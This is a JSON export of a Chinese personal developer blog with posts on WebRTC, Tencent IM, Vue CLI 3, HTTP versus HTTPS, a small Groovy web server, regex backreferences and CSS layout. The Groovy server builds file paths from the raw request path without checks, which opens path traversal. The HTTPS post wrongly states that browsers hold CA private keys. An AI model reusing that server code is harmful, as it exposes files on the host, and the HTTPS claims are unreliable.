{"meta":{"title":"JsPeng BLOG","subtitle":"","description":"个人博客，用于分享一些在日常工作生活中遇到的比较有趣的东西。七荤八素，胡言乱语，望各位看官见谅。","author":{"name":"Fan PengZheng","link":"https://jspeng.com"},"url":"http://www.jspeng.com","root":"/"},"pages":[{"title":"","date":"2021-03-22T06:12:29.480Z","updated":"2021-03-22T06:12:29.480Z","comments":true,"path":"404.html","permalink":"http://www.jspeng.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"我的朋友们","date":"2018-05-12T14:47:53.000Z","updated":"2018-09-12T14:52:11.000Z","comments":true,"path":"friends/index.html","permalink":"http://www.jspeng.com/friends/index.html","excerpt":"","text":"wclimbcurtain TanBlog Luovolantis"},{"title":"欢迎你的到来","date":"2019-07-26T20:21:08.000Z","updated":"2021-03-23T07:57:00.485Z","comments":true,"path":"about/index.html","permalink":"http://www.jspeng.com/about/index.html","excerpt":"","text":"关于我我主要在这个博客上分享一些有趣的程序、干货、技巧、开发教程、心情和学习记录等等！在我从一开始学习编程到现在，在不断的查资料中，我发现很多人都会把一些重要的东西记录下来，方便以后查看。在现在这个互联网时代，快速的学习过程，甚至没有时间打开笔墨，博客确实是个不错的选择。既能写一年后还能看得懂博客，又能把经验变成不可替代性可见的东西。在提高自己总结性能力的同时，也让博客成为了自己一份独特的名片。 学习是一个充实愉悦的过程喜欢尝试，期待新鲜事物前端即兴趣，兴趣即未来行路有良友，便是捷径期待有机会与您共事！ 以下是我的联系方式 邮件: &#x31;&#x38;&#50;&#50;&#48;&#53;&#53;&#57;&#57;&#56;&#x36;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;"},{"title":"所有标签","date":"2021-03-22T07:46:39.427Z","updated":"2021-03-22T07:46:39.427Z","comments":true,"path":"tags/index.html","permalink":"http://www.jspeng.com/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2021-03-22T07:53:24.791Z","updated":"2021-03-22T07:53:24.791Z","comments":true,"path":"categories/index.html","permalink":"http://www.jspeng.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"webRTC实时音视频直播","slug":"webRTC","date":"2021-02-24T06:27:19.000Z","updated":"2021-02-24T08:35:11.000Z","comments":true,"path":"2021/02/24/webRTC/","link":"","permalink":"http://www.jspeng.com/2021/02/24/webRTC/","excerpt":"","text":"因整个直播相关业务较为庞大并且都是博主独立负责开发，涵盖主播及用户和不同端以及不同的直播模式(1v1 1v6 视频、课件H5直播等)以满足不同需求及场景，以及目前在着手忙公司其他项目上线，就先展现下项目最终效果 后期会整理出详细的代码实现过程，如有兴趣可以联系我邮箱期待与你分享，加油打工人~ webRTC项目最终实现展示主播（讲师）推流端1对1实时音视频直播小程序直播 这是Anchor 讲师端。 这是Audience 学员端。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://www.jspeng.com/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"webRTC","slug":"webRTC","permalink":"http://www.jspeng.com/tags/webRTC/"},{"name":"实时音视频","slug":"实时音视频","permalink":"http://www.jspeng.com/tags/%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/"},{"name":"即时通讯","slug":"即时通讯","permalink":"http://www.jspeng.com/tags/%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/"}]},{"title":"微信小程序接入腾讯云IM即时通讯","slug":"微信小程序接入腾讯云IM即时通讯","date":"2019-07-21T14:32:44.000Z","updated":"2019-07-21T15:04:32.000Z","comments":true,"path":"2019/07/21/微信小程序接入腾讯云IM即时通讯/","link":"","permalink":"http://www.jspeng.com/2019/07/21/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%85%A5%E8%85%BE%E8%AE%AF%E4%BA%91IM%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/","excerpt":"","text":"会话列表功能概述： 登录 ：先用自己的账号登录腾讯云； 获取会话列表 ：登录之后再获取会话列表； 更新未读消息数量 ：获取会话列表之后更新未读消息数量 会话列表页效果图(测试截图) 聊天窗口效果图(测试截图) 这是用腾讯云IM通讯在小程序里面实现即时通讯的效果,已经上线，感兴趣的大佬可以通过邮箱和我联系，相互学习共同进步。","categories":[{"name":"经验总结","slug":"经验总结","permalink":"http://www.jspeng.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://www.jspeng.com/tags/JavaScript/"},{"name":"即时通讯","slug":"即时通讯","permalink":"http://www.jspeng.com/tags/%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/"},{"name":"小程序","slug":"小程序","permalink":"http://www.jspeng.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"vue3.0初体验有哪些实用新功能","slug":"vue3.0初体验有哪些实用新功能","date":"2019-04-23T10:54:32.000Z","updated":"2019-04-23T11:29:49.000Z","comments":true,"path":"2019/04/23/vue3.0初体验有哪些实用新功能/","link":"","permalink":"http://www.jspeng.com/2019/04/23/vue3.0%E5%88%9D%E4%BD%93%E9%AA%8C%E6%9C%89%E5%93%AA%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%96%B0%E5%8A%9F%E8%83%BD/","excerpt":"","text":"尤雨溪：Vue 3.0 计划 掘金译文 关于安装Vue CLI 的包名称由 vue-cli 改成了 @vue/cli 1234npm install -g @vue/cli安装完成后查看版本vue --V 项目创建关于项目创建，除了命令创建3.x还增加了图形化界面创建以及管理vue项目在创建新项目时还可以混合选用多种集成 TypeScript PWA Vue Router &amp; Vuex ESLint / TSLint / Prettier 用 Jest 或 Mocha 进行单元测试 用 Cypress 或者 Nightwatch 进行 E2E 测试 使用命令创建命令：vue create vueapp 使用上下箭头选择默认设置还是手动选择功能 1234Vue CLI v3.0.3? Please pick a preset: default (babel, eslint)&gt; Manually select features 按空格键选择你需要的功能，选完后按回车 123456789101112131415161718192021babel：javascript转译器，将最新版的js语法（es6、es7）转换为现阶段浏览器可以兼容的js代码typescript：使用 TypeScript 书写源码PWA：渐进式WEB应用Router：使用vue-routerVuex：使用vuexCSS Pre-processors：css预处理器Linter / Formatter：代码规范标准Unit Testing：单元测试E2E Testing：e2e测试Vue CLI v3.0.3? Please pick a preset: Manually select features? Check the features needed for your project: (*) Babel ( ) TypeScript ( ) Progressive Web App (PWA) Support (*) Router (*) Vuex&gt;(*) CSS Pre-processors (*) Linter / Formatter ( ) Unit Testing ( ) E2E Testing router是否使用history模式，history需要服务器支持 css预处理器的选择，我习惯用sass 代码格式化检测选择，我用的是ide是vscode个人感觉搭配插件用着很舒服，所以我选Prettier 是否保存刚才的配置，下一次就不用重新配置了，我就直接回车 关于Babel, PostCSS, ESLint, etc.这些配置文件你是想放在package.json里面还是单独放在外面编辑器一般默认会在项目根目录下寻找配置文件，这里我就直接回车选择In dedicated config files 是否保存为未来项目的预配置吗，我也是直接回车 最后配置如下 123456789Vue CLI v3.0.3? Please pick a preset: Manually select features? Check the features needed for your project: Babel, Router, Vuex, CSS Pre-processors, Linter? Use history mode for router? (Requires proper server setup for index fallback in production) No? Pick a CSS pre-processor (PostCSS, Autoprefixer and CSS Modules are supported by default): Sass/SCSS? Pick a linter / formatter config: Prettier? Pick additional lint features: Lint on save? Where do you prefer placing config for Babel, PostCSS, ESLint, etc.? In dedicated config files? Save this as a preset for future projects? Yes 图形化界面图形化操作非常方便，我就不一步步演示了，主要懒得贴图 (°ー°〃) 123执行npm命令vue ui访问 http://localhost:8000 你就可以创建，管理，导入项目 实用新功能 node_modules public src .browserslistrc .eslintrc.js .gitignore babel.config.js package.json postcss.config.js README.md 以上是项目根目录，3.x对比2.x文件结构明显精简了不少，多了一个public文件夹用于存放静态文件少了config、build等一系列的配置文件，这些配置文件都被放在了node_modules@vue文件下 browserslist根目录中多了一个.browserslist文件，可以指定项目的目标浏览器的范围用于转译的 JavaScript 特性和添加CSS 浏览器前缀，可以减少兼容代码提高代码质量如果想少一个文件，你也可以在package.json中添加browserslist字段，参数是一个数组 1234这是默认设置，兼容所有最新版本，不支持ie8以下&gt; 1%last 2 versionsnot ie &lt;= 8 使用 npx browserslist 可以查看项目的浏览器兼容情况将需要支持的目标浏览器参数放在文件中就好 vue-cli服务在一个 Vue CLI 项目中，@vue/cli-service 安装了一个名为 vue-cli-service 的命令。你可以在 npm scripts 中以 vue-cli-service、或者从终端中以 ./node_modules/.bin/vue-cli-service 访问这个命令Vue CLI 项目有三个模式： development 模式用于启动，production 模式用于打包和e2e测试，test 模式用于unit测试 123456789101112131415161718192021222324252627启动serve:vue-cli-service serve --open 在服务器启动时打开浏览器 --copy 在服务器启动时将 URL 复制到剪切版 --mode 指定环境模式 (默认值：development) --host 指定 host (默认值：0.0.0.0) --port 指定 port (默认值：8080) --https 使用 https (默认值：false)打包build:vue-cli-service build --modern 使用现代模式构建应用，为现代浏览器交付原生支持的 ES2015 代码，并生成一个兼容老浏览器的包用来自动回退。 --target 允许你将项目中的任何组件以一个库或 Web Components 组件的方式进行构建。更多细节请查阅构建目标。 --report 和 --report-json 会根据构建统计生成报告，它会帮助你分析包中包含的模块们的大小测试 test: vue-cli-service test:e2e 端到端测试 vue-cli-service test:unit 单元测试 现代模式为了兼容那些不支持js新特性的浏览器我们需要Babel转译，但转译后的代码笨重冗长，这次3.x提供了一个现代模式 1npx vue-cli-service build --modern 这个命令会产生两个应用的版本：一个现代版的包，面向支持 ES modules 的现代浏览器，另一个旧版的包，面向不支持的旧浏览器而且不需要我们手动去部署和设置什么，简直很贴心 现代版的包会通过 &lt;script type=&quot;module&quot;&gt; 在被支持的浏览器中加载；它们还会使用 &lt;link rel=&quot;modulepreload&quot;&gt; 进行预加载 旧版的包会通过 &lt;script nomodule&gt; 加载，并会被支持 ES modules 的浏览器忽略 一个针对 Safari 10 中 &lt;script nomodule&gt; 的修复会被自动注入 插件的添加在一个已经被创建好的项目中安装一个插件,使用vue add命令 CLI 插件安装每个 CLI 插件都会包含一个 (用来创建文件的) 生成器和一个 (用来调整 webpack 核心配置和注入命令的) 运行时插件对于这种cli插件需要加入@vue的前缀，这个命令将 @vue/eslint 解析为完整的包名 @vue/cli-plugin-eslint，然后从 npm 安装它，调用它的生成器 12345插件添加vue add @vue/eslint向被安装的插件传递生成器选项 (这样做会跳过命令提示)vue add @vue/eslint --config airbnb --lintOn save 第三方插件安装123456安装并调用 vue-cli-plugin-apollo，不带 @vue 前缀，该命令会换作解析一个 unscoped 的包执行此命令后src里会创建一个plugins文件夹，里面会自动生成关于插件的配置文件vue add axios基于一个指定的 scope 使用第三方插件，如果一个插件名为 @foo/vue-cli-plugin-bar，你可以这样添加它：vue add @foo/bar 配置修改例：向所有 Sass 样式传入共享的全局变量在根目录新建一个vue.config.js，加入以下配置 123456789101112module.exports = &#123; css: &#123; loaderOptions: &#123; // 给 sass-loader 传递选项 sass: &#123; // @/ 是 src/ 的别名 // 所以这里假设你有 `src/variables.scss` 这个文件 data: `@import &quot;@/variables.scss&quot;;` &#125; &#125; &#125;&#125; 打包后路径问题在vue.config.js文件中加入’baseUrl: ‘./‘’ 12345module.exports = &#123; //... baseUrl: &#x27;./&#x27; //...&#125; 虽然官方说这个文件会被 @vue/cli-service 自动加载，但如果你启动项目用的是npm run serve，那么你最好使用npx vue-cli-service serve重启一下","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"vue","slug":"vue","permalink":"http://www.jspeng.com/tags/vue/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://www.jspeng.com/tags/JavaScript/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"浅谈 HTTP 和 HTTPS","slug":"浅谈 HTTP 和 HTTPS","date":"2019-03-21T13:45:59.000Z","updated":"2019-03-21T14:28:06.000Z","comments":true,"path":"2019/03/21/浅谈 HTTP 和 HTTPS/","link":"","permalink":"http://www.jspeng.com/2019/03/21/%E6%B5%85%E8%B0%88%20HTTP%20%E5%92%8C%20HTTPS/","excerpt":"","text":"前言说起 HTTP 协议让我想起了之前做的 socket 聊天，自己定义了一套规则 比如定义一个特殊字符 socket 读到了这个特殊字符 就代表这是一整句结束 显示到界面，发送文件还定义的是一个 Magic Number 告诉 socket 不要按照字符串解析了。 现在想起来 我当时做的事情就是自定义协议 用来规范客户端和服务端的通讯 而 HTTP 协议就是干这个事情的 来规范服务器和客户端的请求&amp;响应标准。 简单介绍 HTTPHTTP 是基于 TCP/IP 协议，也叫超文本传输协议(HyperText Transfer Protocol) 默认端口 80。 在 《图解 HTTP》 书中指出正确的名字应该叫做 超文本转移协议。 特点 请求&amp;响应: 客户端发送请求 服务器响应请求 无状态(stateless): 在传输过程中 HTTP 不会保留之前的历史信息 等待服务器响应之后 断开连接 要传输数据时必须重新连接。 之所以 HTTP 设计足够简单 是为了更快的处理大量事务 确保协议的可伸缩性 因为无法保留用户的数据，所以后面引入了 cookie 机制 这里就不做介绍了。 命令在 HTTP 中一共 10 种命令(也就是我们现在所说的方法 Method) 来告诉服务器应该采用哪些方式处理 方法 说明 协议版本 GET 获取资源 1.0/1.1 POST 传输实体主体 1.0/1.1 PUT 传输文件 1.0/1.1 HEAD 获取报文首部 1.0/1.1 DELETE 删除文件 1.0/1.1 OPTIONS 查看支持的方法 1.1 TRACE 追踪路径 1.1 CONNECT 连接代理 1.1 LINK 和 UNLINK 已经在 1.1 的版本中移除 这里最常用的还是 GET/POST 如果你的服务是 RESTful 接口 那应该会用到 PUT/DELETE/OPTIONS 报文在 HTTP 传输的信息叫做 HTTP 报文 ，报文是由 (报文首部) 和 (报文主体) 构成 它们就是由数据构成的字符串文本。 HTTPS 介绍由于 HTTP 是明文传输，所以很容易遭到中间人攻击 ，所以使用了 SSL 来进行加密 HTTP 传输内容，SSL 和 HTTP 的组合使用 叫做 HTTPS。 它是在 HTTP 之上 添加了一层加密协议，客户端和服务端每一次传输的数据都需要经过一层特殊处理 即 加密/解密 所以在速度上逊于 HTTP，这个东西的目的只有一个: 保证你发送/接收的数据都是你的服务器在处理 ，因为在 HTTPS 没有出现之前 如何保证你接收的数据是来自你的服务器 是一个难题。 然而 SSL 并不是为了 HTTP 加密而开发的加密技术，SSL 最初是由网景公司开发 不认识？最先开发浏览器那家公司 ，3.0版本之后交给了 IETF。 我们大致了解了这两个协议之后 来看看这个 S 到底安全在哪里？ 对 HTTP 进行中间人攻击 或许你现在正在遭受你的运营商使用中间人攻击 篡改数据 添加广告来实现盈利，这是经常发生的事情 但是放心 我的网站已加上了 HTTPS 所以不会出现这种情况。 如果你是 windows 可以使用 Wireshark，MacOs 使用大名鼎鼎的花瓶(Charles)， 通过 Charles 进行拦截,拦截后我们能看到在 Charles 拦截时 HTTP 使用明文传输 所以我们可以利用并更改这些数据。 在我攻击的那几秒中 发生了什么？HTTP 在传输的过程中 是以明文传输的，如果这里面包含了你的密码 中间人一样的能够获取到并用你的身份来进行操作，尽管有的网站对密码进行了加密 中间人只需要获取到登陆之后的 cookie 即可 来完成身份的伪造。 对 HTTPS 进行中间人攻击这次就选用本站来做个演示。 能看到正常访问情况下 在地址的前面会带上一个小锁的标志，这代表当前的网站是安全的即使用了 HTTPS 按照同样的方法来进行中间人 但是在一开始的时候 就出现了问题 能看到在花瓶中 无法解析这个数据包 请求前面也有一个小锁的标志 接下来该怎么办呢？ 这个时候就需要明白这个 S 到低做了什么？ 先来说一说这个 HTTPS 采用的加密算法HTTPS 是采用 SSL 的非对称加密算法也叫公开密钥密码。 所谓非对称加密算是指加密和解密的密钥都不是同一个，明文加密后能够获取到两个密钥 一个叫做公钥(public key)在互联网进行传输的，还有一个叫做私钥(private key) ,它们应该成套出现 需要注意的是 公钥和私钥都能够用来加密和解密 用公钥加密用私钥解密叫做加密传输用私钥加密用公钥解密叫做认证签名 对称加密刚好是相反，它指加密和解密秘钥都是用的同一个，通过秘钥加密明文 也通过秘钥解密密文 这种算法安全性取决于秘钥的安全性 因为秘钥一旦丢失 获取到的密文可以直接进行解密 也就无任何安全可言了。 在 HTTPS 中，如果使用了对称加密算法 那如何保证秘钥安全的送达客户端？我们又好像回到了最开始的问题 ，如果不发送秘钥 浏览器拿到了密文也无法进行解密 ，发送了秘钥中间人也能获取到 那就无意义了 这是一个死循环。 为了大家更好的理解非对称加密的特点，我举一个例子。 我生成了一套密钥，并把公钥写在了我的网站上。(公钥公开 私钥保留) 你现在想给我发送邮件，但是想加密邮件的内容 所以就使用了我的公钥加密了邮件的内容 并且给我发了过来 我收到邮件后发现是一串密文，我尝试用我的私钥解密 发现解开了 这个时候我就知道有人用我的公钥给我发送了邮件 以上就完成一次数据的加密传输，尽管私钥和公钥在数学上面有一些关联 但是想要破解真的是太难了。 由于 SSL 有两个密钥，发送的密文使用公钥进行加密的 私钥并不会传递 所以就有了第三方的数组认证机构 (CA,Certificate Authority),而现代浏览器比如 Chrome 在开发时就会注入主流的认证机构密钥(公钥和私钥)，所以我们如果想要给网站加上 HTTPS 支持 只需要向第三方机构申请安全证书即可 剩下的浏览器会帮我们处理。 即使这样真的可以防止中间人攻击吗？你如何保证第三方认证机构不会把证书授权给那些不法分子呢？因为信仰不同？ 你想多了 只要赚钱 这些第三方一样的会把证书发布给他们。在花瓶中 是能够处理 HTTPS 的数据包 因为花瓶自带了证书(笑) 先来打开 SSL 代理 看到了吗？我们一样能够获取到内容，那有的人就会问了 不是说 HTTPS 可以保证安全吗？为什么还能够进行中间人攻击？ 接下来就要介绍 SSL 的第二个特征 SSL 数字证书上面说到过 ，使用私钥加密用公钥解密的表示认证签名 还是举一个例子来说明 我发布了一篇文章，这个时候如何证明文章是我本人发的？我会在文章最底部留下一串密文 这个密文是通过文章内容 MD5 之后的密文 然后再通过我的私钥加密的private_key.encode(MD5.encode(article.content)); 大家因为都有我的公钥，所以去尝试解密 如果这里解密失败 不用想了 不是我发的，如果解密成功发现得到了一串 MD5 然后自己加密文章内容 看一看出来的结果是不是我给的 MD5 如果正确就代表这篇文章确实是我本人发的 如果不正确就是被中间人修改了。 因为中间人并不知道我的私钥，一旦文章的内容发生改变 MD5 值就会发生改变，匹配不上 大家自然知道这个文章并不是本所发 如果这个时候中间人自作聪明独自修改了我给的密文 ，那就更简单了 只要它修改了 大家都有我的公钥 通过我的公钥必定解密失败 解密都失败了 那就更不是本人发的了。 这个就是数字证书的作用: 确保数据不被中间人修改。 介绍完了数字证书，继续演示中间人攻击 如果你使用的是 Chrome 能看到浏览器已经知道当前网站被中间人攻击了。 HTTPS 使用了混淆加密因为 HTTPS 在性能上远不如 HTTP，大概是 2-100 倍 但是使用者基本感觉不到 为什么？ 因为1毫秒的100倍也才100毫秒 谁能感觉到呀！ 不过 HTTPS 还是给出了一个比较合理的解决方法，即混淆加密。 什么是混淆加密？我在来举个例子 我和一个小伙伴使用加密的方式聊天，比如使用微信 但是我发现每次都要用私钥解密 公钥加密就太麻烦了呀！ 所以我们规定 在第一次发送消息的时候 我们采用非对称加密的方式，然后把对称加密方式的密钥放进来(比如 DES) 后面我们聊天就不用这么麻烦了，因为我们拿到了一个对称加密的密钥 后面的消息过来只需要 decode 就行了 也不用验证是不是对方发过来的 ，因为每次的首次会话 都会改变对称密钥 这样轻松多了。 自造 HTTPS 的可能？最近在知乎上面看了这个问题，所谓 无知者无畏 为什么我们不能自己造轮子呢？ 我们自己定义一套协议 并且不公开 只有公司自己知道加密方式和解密方式 有没有这个可能？ 我想这个问题 没有对错 有兴趣的同学可以去知乎看看。 最后真实的情况可能远远比我文章说的复杂，但是希望这篇文章能让你基本了解 http 和 https 的区别，学无止境。","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"http","slug":"http","permalink":"http://www.jspeng.com/tags/http/"},{"name":"网络协议","slug":"网络协议","permalink":"http://www.jspeng.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"50 行代码实现一个简单的 WEB 服务器","slug":"50 行代码实现一个简单的 WEB 服务器","date":"2019-02-12T15:25:41.000Z","updated":"2019-02-12T15:29:15.000Z","comments":true,"path":"2019/02/12/50 行代码实现一个简单的 WEB 服务器/","link":"","permalink":"http://www.jspeng.com/2019/02/12/50%20%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%20WEB%20%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"前言：这里的简单是只实现网站根目录的访问，一个完整的 WEB 服务器实现是很复杂的 可参考 nginx。 WEB 服务器的原理是先监听一个 Socket 端口，当 TCP 请求完成握手之后 然后根据 HTTP 协议完成通讯。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950HTTP_PORT = 9999HTTP_ROOT = &#x27;/Users/kanshan/gitProjects/Coder&#x27;def server = new ServerSocket(HTTP_PORT)while(true)&#123; def socket = server.accept() new Thread(&#123; def input = socket.inputStream def output = socket.outputStream try&#123; def outMessage = handler(parserRequest(input)) output.write(outMessage.getBytes()) &#125;catch(Exception ex)&#123; println ex &#125;finally&#123; input.close() output.flush() output.close() &#125; &#125; as Runnable).start()&#125;def parserRequest(InputStream input)&#123; def reader = input.newReader() def protocol = [] while(reader.ready())&#123; def line = reader.readLine() if(!line.isBlank()) protocol &lt;&lt; line &#125; def firstLine = protocol[0].split(&#x27; &#x27;) def wrapper = [:] wrapper.method = firstLine[0] wrapper.router = firstLine[1] wrapper.version = firstLine[2] 1.upto(protocol.size() - 1)&#123; def kv = protocol[it].split(&#x27;:&#x27;) wrapper.&quot;$&#123;kv[0]&#125;&quot; = kv[1].trim() &#125; return wrapper&#125;def handler(wrapper)&#123; def buffer = new StringBuffer() buffer.append(&quot;$&#123;wrapper.version&#125; 200 OK\\r\\n&quot;) buffer.append(&quot;&quot;) buffer.append(&quot;\\r\\n&quot;) def file = new File(&quot;$&#123;HTTP_ROOT&#125;$&#123;File.separator&#125;$&#123;wrapper.router&#125;&quot;) if(!file.isDirectory() &amp;&amp; file.exists() &amp;&amp; file.canRead())&#123; buffer.append(file.text) &#125; return buffer.toString()&#125; 之后可以考虑使用 NIO 实现。 以上就是全部的代码，这里监听的是 9999 端口，设置网站根目录为: /Users/kanshan/gitProjects/Coder，改兴趣可以拷贝到 app.groovy 中，使用 groovy app.groovy 运行。","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.jspeng.com/tags/web/"},{"name":"服务器","slug":"服务器","permalink":"http://www.jspeng.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"关于Javascript正则的'反向引用'","slug":"关于Javascript正则的'反向引用'","date":"2019-01-12T06:22:44.000Z","updated":"2019-01-12T07:26:04.000Z","comments":true,"path":"2019/01/12/关于Javascript正则的'反向引用'/","link":"","permalink":"http://www.jspeng.com/2019/01/12/%E5%85%B3%E4%BA%8EJavascript%E6%AD%A3%E5%88%99%E7%9A%84'%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8'/","excerpt":"","text":"前言: 本来是在看着阿树博客里的js规范的，不知道怎么搞得，稀里糊涂的就看到正则去了，把学到的东西总结一下。 首先先看下面这个例子：12&quot;abcd&quot;.match(/(a(bc)d)/);//result: [&quot;abcd&quot;, &quot;abcd&quot;, &quot;bc&quot;] 这个例子说明看括号匹配顺序是按左括号计算的。（这是别人的理解，我的理解是匹配顺序是按从外到里从左到右计算的，每个反向引用都由一个编号或名称来标识，并通过“\\编号”表示法进行引用，外面的组的编号靠前。也就是说引用分组是编号排列是从外到内编排。） 再看这个例子1234&#x27;aaa&#x27;.match(/(a\\1)/);//result: [&#x27;a&#x27;] &#x27;aaaaaaa&#x27;.match(/(a\\1\\1\\1\\1\\1)/); //result: [&#x27;a&#x27;] 由这个例子可以看出/(a\\1)/在第一个括号中使用\\1引用是没有意义的，同时在chrome中的测试结果表明，无论在第n个括号中有几个\\n都会被忽略。（既从最外层括号往里层数） 最后基于上述两个例子的解读，咱们可以把下边的例子进行转换 12345&#x27;aaabbbcccdddeeefff&#x27;.match(/[abc]\\1/g);//null &#x27;aaabbbcccdddeeefff&#x27;.match(/([abc])\\1/g);//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;] &#x27;aaabbbcccdddeeefff&#x27;.match(/(([abc])\\1)\\1/g);//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;] &#x27;aaabbbcccdddeeefff&#x27;.match(/(([abc])\\1)\\2/g);//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;] &#x27;aaabbbcccdddeeefff&#x27;.match(/((([abc])\\1)\\2)\\3/g);//[&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;] 可简化为 12345&#x27;aaabbbcccdddeeefff&#x27;.match(/[abc]\\1/g);//null &#x27;aaabbbcccdddeeefff&#x27;.match(/([abc])\\1/g);//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;] &#x27;aaabbbcccdddeeefff&#x27;.match(/(([abc]))\\1/g);//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;] &#x27;aaabbbcccdddeeefff&#x27;.match(/(([abc]))\\2/g);//[&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;] &#x27;aaabbbcccdddeeefff&#x27;.match(/((([abc]))\\2)\\3/g);//[&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;] 参考文档 如何理解javascript正则“反向引用”","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://www.jspeng.com/tags/JavaScript/"},{"name":"学习","slug":"学习","permalink":"http://www.jspeng.com/tags/%E5%AD%A6%E4%B9%A0/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"基于Inline-Block布局+vertical-Align的研究","slug":"基于Inline-Block布局+vertical-Align的研究","date":"2019-01-12T06:22:44.000Z","updated":"2019-01-12T06:38:58.000Z","comments":true,"path":"2019/01/12/基于Inline-Block布局+vertical-Align的研究/","link":"","permalink":"http://www.jspeng.com/2019/01/12/%E5%9F%BA%E4%BA%8EInline-Block%E5%B8%83%E5%B1%80+vertical-Align%E7%9A%84%E7%A0%94%E7%A9%B6/","excerpt":"","text":"前言：这个探究主要源于ife任务6的一个布局困扰，继而产生以下这些探究及结论，如解释有误或有新的见解，请及时与我联系，谢谢大家的捧场。 问题引入有需求才会有解决方案，那么，这个需求是什么呢？ 这是任务6布局的两个点 review了许多同学的代码，实现方式基本局限于两种，position定位、float+内外边距再者就是两者结合，那么又没有第三种更为简单的适合的方法呢？答案是有的，那就是基于inlink-block+vertical-align的方式 inline-block + vertical-align什么是inline-block相信大家比我还要清楚，但用来布局的话还有几个重要的点需要大家着重注意的： inline-block是行内块级元素，因此这种布局仅适用于单排布局（这点大家应该不会有太多异议吧） inline-block布局+vertical-align的关键点在于valign特性的使用，因此对于vertical-align的理解尤为关键（具体可参照张鑫旭大神关于vertical-align的理解） 解决方法基于上述技术，我写了一个新的解决方法，具体如下： html代码部分： 12345678&lt;header class=&quot;header&quot;&gt; &lt;div class=&quot;header-mark&quot;&gt; &lt;span&gt;ife.baidu.com&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;header-date&quot;&gt; &lt;span&gt;2016.03&lt;/span&gt; &lt;/div&gt;&lt;/header&gt; css代码部分： 123456789101112131415161718192021222324252627282930313233/*头部*/.header&#123; font-size: 12px; vertical-align: bottom;&#125; .header-mark&#123; float: left; width: 110px; height: 61px; display: inline-block; background-color: #d45d5c; &#125; .header-mark::before&#123; content:&#x27;&#x27;; line-height: 58px; &#125; .header-mark&gt;span&#123; vertical-align: bottom; &#125; .header-date&#123; float:right; height: 61px; display: inline-block; color: #d45d5c; &#125; .header-date::before&#123; content:&#x27;&#x27;; line-height: 58px; margin-left: -0.5em; &#125; .header-date&gt;span&#123; vertical-align: bottom; &#125; 原理其实很简单，利用伪元素去做基准线，然后其它元素以伪元素为基准进行排布，方便快捷，更重要的是这种方式维护起来也跟方便 结语 写的不好的地方请大家多多包涵，也请大家不吝啬给出意见，共同学习，共同进步，谢谢大家！","categories":[{"name":"日常学习","slug":"日常学习","permalink":"http://www.jspeng.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://www.jspeng.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"百度Ife","slug":"百度Ife","permalink":"http://www.jspeng.com/tags/%E7%99%BE%E5%BA%A6Ife/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"2018年个人总结","slug":"2018年个人总结","date":"2019-01-05T13:32:41.000Z","updated":"2019-01-05T13:42:39.000Z","comments":true,"path":"2019/01/05/2018年个人总结/","link":"","permalink":"http://www.jspeng.com/2019/01/05/2018%E5%B9%B4%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/","excerpt":"","text":"工作方面2018这一年说快也不快，说慢也不慢，风风火火的